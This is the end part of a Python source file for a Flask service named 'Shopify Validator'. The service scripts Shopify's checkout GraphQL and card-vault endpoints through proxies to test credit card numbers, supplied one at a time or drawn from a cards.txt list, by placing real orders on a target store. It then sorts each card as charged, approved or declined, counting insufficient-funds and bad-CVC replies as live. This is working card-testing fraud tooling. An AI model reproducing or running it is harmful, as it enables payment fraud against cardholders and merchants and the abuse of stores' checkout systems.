                                "deliveryStrategyMatchingConditions": {
                                    "estimatedTimeInTransit": {"any": True},
                                    "shipments": {"any": True},
                                },
                                "options": {},
                            },
                            "targetMerchandiseLines": {"any": True},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"any": True},
                            "destinationChanged": True,
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": False,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stableId or "1",
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None,
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": "", "city": "", "countryCode": country_code,
                                "lastName": "", "zoneCode": "ENG", "phone": "",
                            }
                        },
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email,
                        "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"countryCode": country_code},
                        "rememberMe": False,
                    },
                    "tip": {"tipLines": []},
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": "0", "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "scriptFingerprint": {
                        "signature": None,
                        "signatureUuid": None,
                        "lineItemScriptChanges": [],
                        "paymentScriptChanges": [],
                        "shippingScriptChanges": [],
                    },
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "operationName": "Proposal",
            }

            for i in range(2):
                resp = await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy)
                resp_text = await resp.text()
                if i == 0:
                    await asyncio.sleep(3)

            try:
                resp_json = json.loads(resp_text)
            except json.JSONDecodeError:
                return _result("INVALID_RESPONSE")

            if "errors" in resp_json and not resp_json.get("data"):
                return _result("GRAPHQL_ERROR")

            session_data = resp_json.get("data", {}).get("session")
            if not session_data:
                return _result("NO_SESSION_DATA")

            negotiate = session_data.get("negotiate")
            if not negotiate:
                return _result("NEGOTIATE_FAILED")

            result = negotiate.get("result", {})
            result_type = result.get("__typename", "Unknown")

            if result_type in ("CheckpointDenied", "Throttled", "NegotiationResultFailed"):
                return _result(result_type.upper())

            checkpoint_data = result.get("checkpointData")
            seller_proposal = result.get("sellerProposal")
            if not seller_proposal:
                return _result("NO_SELLER_PROPOSAL")

            running_total_data = seller_proposal.get("runningTotal")
            if not running_total_data:
                return _result("NO_RUNNING_TOTAL")
            running_total = running_total_data["value"]["amount"]

            delivery_data = seller_proposal.get("delivery", {})
            delivery_type = delivery_data.get("__typename", "")
            delivery_strategy = ""
            shipping_amount = 0.0

            if delivery_type == "FilledDeliveryTerms":
                d_lines = delivery_data.get("deliveryLines", [{}])
                if d_lines:
                    strategies = d_lines[0].get("availableDeliveryStrategies", [])
                    if strategies:
                        delivery_strategy = strategies[0].get("handle", "")
                        try:
                            shipping_amount = float(strategies[0].get("amount", {}).get("value", {}).get("amount", "0"))
                        except (ValueError, TypeError):
                            shipping_amount = 0.0

            tax_data = seller_proposal.get("tax", {})
            tax_amount = 0.0
            if tax_data and tax_data.get("__typename") == "FilledTaxTerms":
                try:
                    tax_amount = float(tax_data.get("totalTaxAmount", {}).get("value", {}).get("amount", "0"))
                except (ValueError, TypeError):
                    pass

            payment_data = seller_proposal.get("payment", {})
            payment_identifier = None
            if payment_data and payment_data.get("__typename") == "FilledPaymentTerms":
                for method in payment_data.get("availablePaymentLines", []):
                    pm = method.get("paymentMethod", {})
                    if pm.get("paymentMethodIdentifier"):
                        payment_identifier = pm["paymentMethodIdentifier"]
                        gateway = pm.get("extensibilityDisplayName") or pm.get("name", "Shopify Payments")
                        total_price = str(float(running_total) + shipping_amount + tax_amount)
                        break

            if not payment_identifier:
                return _result("NO_PAYMENT_METHOD")

            # Step 4: Delivery proposal
            json_data["query"] = QUERY_PROPOSAL_DELIVERY
            json_data["variables"]["delivery"]["deliveryLines"][0]["selectedDeliveryStrategy"] = {
                "deliveryStrategyByHandle": {"handle": delivery_strategy, "customDeliveryRate": False},
                "options": {},
            }
            json_data["variables"]["delivery"]["deliveryLines"][0]["targetMerchandiseLines"] = {"lines": [{"stableId": stableId or "1"}]}
            json_data["variables"]["delivery"]["deliveryLines"][0]["expectedTotalPrice"] = {"value": {"amount": str(shipping_amount), "currencyCode": currency}}
            json_data["variables"]["delivery"]["deliveryLines"][0]["destinationChanged"] = False
            json_data["variables"]["payment"]["billingAddress"] = {
                "streetAddress": {
                    "address1": street, "address2": "", "city": city,
                    "countryCode": country_code, "postalCode": s_zip,
                    "firstName": firstName, "lastName": lastName,
                    "zoneCode": state, "phone": phone,
                }
            }
            json_data["variables"]["taxes"]["proposedTotalAmount"]["value"]["amount"] = str(tax_amount)
            json_data["variables"]["buyerIdentity"]["shopPayOptInPhone"]["number"] = phone

            resp = await session.post(graphql_url, params=params, headers=headers, json=json_data, proxy=proxy)

            # Step 5: Tokenize card
            vault_payload = {
                "credit_card": {
                    "number": cc, "month": int(month), "year": int(year),
                    "verification_value": cvv, "name": f"{firstName} {lastName}",
                    "start_month": None, "start_year": None, "issue_number": "",
                },
                "payment_session_scope": urlparse(ourl).netloc,
            }
            vault_headers = {
                "Content-Type": "application/json",
                "Accept": "application/json",
                "Accept-Language": "en-US,en;q=0.9",
                "Origin": "https://checkout.pci.shopifyinc.com",
                "User-Agent": headers["User-Agent"],
                "sec-ch-ua-mobile": "?0",
                "sec-ch-ua-platform": '"Windows"',
            }
            if ident_sig:
                vault_headers["shopify-identification-signature"] = ident_sig

            vault_resp = await session.post("https://checkout.pci.shopifyinc.com/sessions", json=vault_payload, headers=vault_headers, proxy=proxy)
            try:
                token_data = await vault_resp.json()
                token = token_data.get("id")
                if not token:
                    return _result("TOKENIZATION_FAILED")
            except Exception:
                return _result("TOKENIZATION_FAILED")

            # Step 6: Submit for completion
            submit_variables = {
                "input": {
                    "sessionInput": {"sessionToken": sst},
                    "queueToken": queueToken or "",
                    "discounts": {"lines": [], "acceptUnexpectedDiscounts": True},
                    "delivery": {
                        "deliveryLines": [{
                            "destination": {
                                "streetAddress": {
                                    "address1": street, "address2": "", "city": city,
                                    "countryCode": country_code, "postalCode": s_zip,
                                    "firstName": firstName, "lastName": lastName,
                                    "zoneCode": state, "phone": phone,
                                }
                            },
                            "selectedDeliveryStrategy": {
                                "deliveryStrategyByHandle": {"handle": delivery_strategy, "customDeliveryRate": False},
                                "options": {"phone": phone},
                            },
                            "targetMerchandiseLines": {"lines": [{"stableId": stableId or "1"}]},
                            "deliveryMethodTypes": ["SHIPPING"],
                            "expectedTotalPrice": {"value": {"amount": str(shipping_amount), "currencyCode": currency}},
                            "destinationChanged": False,
                        }],
                        "noDeliveryRequired": [],
                        "useProgressiveRates": True,
                        "prefetchShippingRatesStrategy": None,
                        "supportsSplitShipping": True,
                    },
                    "merchandise": {
                        "merchandiseLines": [{
                            "stableId": stableId or "1",
                            "merchandise": {
                                "productVariantReference": {
                                    "id": f"gid://shopify/ProductVariantMerchandise/{merch}",
                                    "variantId": f"gid://shopify/ProductVariant/{variant_id}",
                                    "properties": [],
                                    "sellingPlanId": None,
                                    "sellingPlanDigest": None,
                                }
                            },
                            "quantity": {"items": {"value": 1}},
                            "expectedTotalPrice": {"value": {"amount": subtotal, "currencyCode": currency}},
                            "lineComponentsSource": None,
                            "lineComponents": [],
                        }]
                    },
                    "payment": {
                        "totalAmount": {"any": True},
                        "paymentLines": [{
                            "paymentMethod": {
                                "directPaymentMethod": {
                                    "paymentMethodIdentifier": payment_identifier,
                                    "sessionId": token,
                                    "billingAddress": {
                                        "streetAddress": {
                                            "address1": street, "address2": "", "city": city,
                                            "countryCode": country_code, "postalCode": s_zip,
                                            "firstName": firstName, "lastName": lastName,
                                            "zoneCode": state, "phone": phone,
                                        }
                                    },
                                    "cardSource": None,
                                }
                            },
                            "amount": {"value": {"amount": running_total, "currencyCode": currency}},
                            "dueAt": None,
                        }],
                        "billingAddress": {
                            "streetAddress": {
                                "address1": street, "address2": "", "city": city,
                                "countryCode": country_code, "postalCode": s_zip,
                                "firstName": firstName, "lastName": lastName,
                                "zoneCode": state, "phone": phone,
                            }
                        },
                    },
                    "buyerIdentity": {
                        "customer": {"presentmentCurrency": currency, "countryCode": country_code},
                        "email": email,
                        "emailChanged": False,
                        "phoneCountryCode": country_code,
                        "marketingConsent": [{"email": {"value": email}}],
                        "shopPayOptInPhone": {"number": phone, "countryCode": country_code},
                        "rememberMe": False,
                    },
                    "taxes": {
                        "proposedAllocations": None,
                        "proposedTotalAmount": {"value": {"amount": str(tax_amount), "currencyCode": currency}},
                        "proposedTotalIncludedAmount": None,
                        "proposedMixedStateTotalAmount": None,
                        "proposedExemptions": [],
                    },
                    "tip": {"tipLines": []},
                    "note": {"message": None, "customAttributes": []},
                    "localizationExtension": {"fields": []},
                    "nonNegotiableTerms": None,
                    "optionalDuties": {"buyerRefusesDuties": False},
                },
                "attemptToken": attempt_token,
                "metafields": [],
                "analytics": {"requestUrl": checkout_url},
            }

            if checkpoint_data:
                submit_variables["input"]["checkpointData"] = checkpoint_data

            submit_json = {
                "query": MUTATION_SUBMIT,
                "variables": submit_variables,
                "operationName": "SubmitForCompletion",
            }

            resp = await session.post(
                graphql_url,
                params={"operationName": "SubmitForCompletion"},
                headers=headers, json=submit_json, proxy=proxy,
            )
            submit_text = await resp.text()

            try:
                submit_resp = json.loads(submit_text)
            except json.JSONDecodeError:
                return _result("CARD_DECLINED")

            submit_data = submit_resp.get("data", {}).get("submitForCompletion", {})
            if not submit_data:
                errors = submit_resp.get("errors", [])
                if errors:
                    code = errors[0].get("code", "")
                    return _result(normalize_response(code), approved="True" if "INSUFFICIENT" in code.upper() else "False")
                return _result("CARD_DECLINED")

            stype = submit_data.get("__typename", "")

            if stype in ("SubmitSuccess", "SubmittedForCompletion", "SubmitAlreadyAccepted"):
                receipt = submit_data.get("receipt", {})
                if receipt:
                    rtype = receipt.get("__typename", "")
                    if rtype == "ProcessedReceipt":
                        return _result("ORDER_PLACED", charged="True", approved="True")
                    if rtype == "ActionRequiredReceipt":
                        return _result("3DS_REQUIRED", approved="True")
                    rid = receipt.get("id")
                    if rid:
                        # Poll for receipt
                        poll_json = {
                            "query": QUERY_POLL,
                            "variables": {"receiptId": rid, "sessionToken": sst},
                            "operationName": "PollForReceipt",
                        }
                        await asyncio.sleep(3)
                        for _ in range(4):
                            poll_resp = await session.post(
                                graphql_url,
                                params={"operationName": "PollForReceipt"},
                                headers=headers, json=poll_json, proxy=proxy,
                            )
                            poll_text = await poll_resp.text()
                            try:
                                poll_data = json.loads(poll_text).get("data", {}).get("receipt", {})
                                pt = poll_data.get("__typename", "")
                                if pt == "ProcessedReceipt":
                                    return _result("ORDER_PLACED", charged="True", approved="True")
                                elif pt == "FailedReceipt":
                                    err = poll_data.get("processingError", {})
                                    code = err.get("code", "") or err.get("messageUntranslated", "")
                                    return _result(normalize_response(code), approved="True")
                                elif pt == "ActionRequiredReceipt":
                                    return _result("3DS_REQUIRED", approved="True")
                                elif pt in ("ProcessingReceipt", "WaitingReceipt"):
                                    await asyncio.sleep(4)
                                    continue
                            except Exception:
                                pass
                            break
                return _result("CARD_DECLINED")

            elif stype == "SubmitFailed":
                reason = submit_data.get("reason", "")
                return _result(normalize_response(reason))

            elif stype == "SubmitRejected":
                errors = submit_data.get("errors", [])
                if errors:
                    code = errors[0].get("code", "")
                    msg = errors[0].get("localizedMessage", "") or errors[0].get("nonLocalizedMessage", "")
                    raw = code if code not in ("GENERIC_ERROR", "PAYMENT_FAILED", "") else msg
                    normalized = normalize_response(raw)
                    approved = "True" if normalized in ("INSUFFICIENT_FUNDS", "INVALID_CVC", "3DS_REQUIRED") else "False"
                    return _result(normalized, approved=approved)
                return _result("CARD_DECLINED")

            elif stype == "Throttled":
                return _result("CARD_DECLINED")

            return _result("CARD_DECLINED")

    except Exception as e:
        elapsed = round(time.time() - start_time, 1)
        return {
            "Response": "CARD_DECLINED",
            "CC": f"{cc}|{month}|{year}|{cvv}",
            "Price": total_price,
            "Gate": gateway,
            "Site": site_url,
            "Charged": "False",
            "Approved": "False",
            "Time": f"{elapsed}s",
        }


app = Flask(__name__)


@app.route("/shopify", methods=["GET"])
def shopify_api():
    """
    Validate a card against a Shopify store.
    Query params:
      - site: Shopify store URL (required)
      - cc: Card in CC|MM|YYYY|CVV format (optional - random from cards.txt if omitted)
      - proxy: Proxy string (optional)
    """
    site = request.args.get("site")
    cc_string = request.args.get("cc")
    proxy_str = request.args.get("proxy")

    if not site:
        return jsonify({"error": "Missing 'site' parameter"}), 400

    if cc_string:
        parts = cc_string.replace(" ", "").split("|")
        if len(parts) != 4:
            return jsonify({"error": "CC format: CC|MM|YYYY|CVV"}), 400
        cc_num, mon, yr, cvv = parts
        if len(yr) == 4 and yr.startswith("20"):
            yr = yr[2:]
    else:
        card = get_random_card()
        if not card:
            return jsonify({"error": "No cards in cards.txt"}), 400
        cc_num, mon, yr, cvv = card["cc"], card["month"], card["year"], card["cvv"]

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)
    try:
        result = loop.run_until_complete(validate_card(cc_num, mon, yr, cvv, site, proxy_str=proxy_str))
    finally:
        loop.close()

    return jsonify(result)


@app.route("/health", methods=["GET"])
def health():
    return jsonify({"status": "ok"})


if __name__ == "__main__":
    print("\n" + "=" * 50)
    print("  SHOPIFY VALIDATOR API")
    print(f"  Max product price: ${MAX_PRODUCT_PRICE:.2f}")
    cards = load_cards()
    print(f"  Cards loaded: {len(cards)}")
    print("=" * 50)
    app.run(host="0.0.0.0", port=5000, debug=False, threaded=True)
